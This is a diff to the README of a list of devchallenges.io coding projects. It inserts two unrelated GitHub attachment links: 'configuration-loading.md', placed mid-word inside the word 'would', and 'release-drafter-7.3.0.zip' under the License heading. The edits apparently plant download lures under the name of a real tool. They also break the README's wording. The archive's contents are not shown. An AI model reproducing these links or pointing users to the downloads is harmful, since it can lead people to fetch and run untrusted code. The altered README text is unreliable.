@@ -101,11 +101,16 @@ To get started, go to devchallenges.io, and choose a project that matches your n
 
 ### Contributing
 
-- If you have a project idea that you would like to add to the list, feel free to submit a pull request, alternatively, you can open an issue that explains the idea in more detail. Please ensure that your project idea is appropriate for the skill level.
+- If you have a project idea that you wo[configuration-loading.md](https://github.com/user-attachments/files/28034635/configuration-loading.md)
+uld like to add to the list, feel free to submit a pull request, alternatively, you can open an issue that explains the idea in more detail. Please ensure that your project idea is appropriate for the skill level.
 - If you find any typo, free feel to submit a pull request.
 
 
 ### License
+
+
+[release-drafter-7.3.0.zip](https://github.com/user-attachments/files/28034639/release-drafter-7.3.0.zip)
+
 
 This project is licensed under the Apache License 2.0.
 
